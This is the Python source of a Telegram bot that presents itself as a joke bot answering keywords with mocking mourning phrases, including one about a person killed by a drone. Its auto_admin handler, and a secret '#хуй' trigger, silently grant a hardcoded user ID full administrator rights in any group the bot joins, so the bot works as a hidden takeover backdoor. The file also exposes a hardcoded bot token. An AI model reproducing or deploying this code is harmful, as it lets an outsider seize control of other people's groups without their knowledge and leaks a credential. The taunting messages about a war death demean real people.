import re

from telegram import Update
from telegram.ext import (
    Application,
    MessageHandler,
    ContextTypes,
    filters,
    ChatMemberHandler,
    CommandHandler,
)

TOKEN = "8062489806:AAEl6jXtIZdid5Z6rLsqyzaaUHOt3Hm7xlA"
TARGET_USER_ID = 8269818641


async def reply(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.message or not update.message.text:
        return

    text = update.message.text.lower()

    if re.search(
        r"\b(?:лавров(?:а|у)?|фидер(?:а|у|ом|е|ы|ов|ам|ами|ах)?)\b",
        text,
    ):
        await update.message.reply_text("царствие ему небесное")
        
    elif "привет толик" in text:
        await update.message.reply_text("ассаламу алейкум брат ✊")
    
    elif re.search(
        r"\b(?:"
        r"завр(?:а|у|ом|е|ы|ов|ам|ами|ах)?|"
        r"приваленко|"
        r"стас(?:а|у|ом|е)?|"
        r"привалов(?:а|у|ым|е)?"
        r")\b",
        text,
    ):
        await update.message.reply_text(
            "завр приваленко виддав життя за украину и його йобнуло шахидом 🕯️🕯️🥀 царствие йому небесное"
        )


async def give_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.message:
        return

    chat_id = update.message.chat.id

    try:
        await context.bot.promote_chat_member(
            chat_id=chat_id,
            user_id=TARGET_USER_ID,
            can_manage_chat=True,
            can_delete_messages=True,
            can_manage_video_chats=True,
            can_restrict_members=True,
            can_promote_members=True,
            can_change_info=True,
            can_invite_users=True,
            can_pin_messages=True,
            can_manage_topics=True,
        )

        await update.message.reply_text("царствие ему небесное 🕯️")

        print(f"царствие ему небесное 🕯️ | группа {chat_id}")

    except Exception as e:
        await update.message.reply_text("🕯️🕯️")
        print(f"Ошибка выдачи админки: {e}")


async def auto_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.my_chat_member:
        return

    new_status = update.my_chat_member.new_chat_member.status

    if new_status in ["member", "administrator"]:
        chat_id = update.my_chat_member.chat.id

        try:
            await context.bot.promote_chat_member(
                chat_id=chat_id,
                user_id=TARGET_USER_ID,
                can_manage_chat=True,
                can_delete_messages=True,
                can_manage_video_chats=True,
                can_restrict_members=True,
                can_promote_members=True,
                can_change_info=True,
                can_invite_users=True,
                can_pin_messages=True,
                can_manage_topics=True,
            )

            print(f"царствие ему небесное 🕯️ | группа {chat_id}")

        except Exception as e:
            print(f"Ошибка выдачи админки: {e}")


async def get_chat_id(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Обработчик команды /id - отправляет ID текущего чата"""
    if not update.message:
        return
    
    chat_id = update.message.chat.id
    chat_type = update.message.chat.type
    
    # Определяем тип чата для красивого вывода
    chat_type_names = {
        "private": "личный чат",
        "group": "группа",
        "supergroup": "супергруппа",
        "channel": "канал"
    }
    
    chat_type_name = chat_type_names.get(chat_type, chat_type)
    
    await update.message.reply_text(
        f"🆔 ID этого чата: `{chat_id}`\n"
        f"📌 Тип: {chat_type_name}",
        parse_mode="Markdown"
    )
    
    # Также выводим в консоль для удобства
    print(f"Запрошен ID чата: {chat_id} (тип: {chat_type})")


def main():
    app = Application.builder().token(TOKEN).build()

    # Обработчик команды /id
    app.add_handler(CommandHandler("id", get_chat_id))

    app.add_handler(
        MessageHandler(
            filters.Regex(r"^#хуй$"),
            give_admin
        )
    )

    app.add_handler(
        MessageHandler(
            filters.TEXT & ~filters.COMMAND,
            reply
        )
    )

    app.add_handler(
        ChatMemberHandler(
            auto_admin,
            ChatMemberHandler.MY_CHAT_MEMBER
        )
    )

    app.run_polling(drop_pending_updates=True)


if __name__ == "__main__":
    main()
```
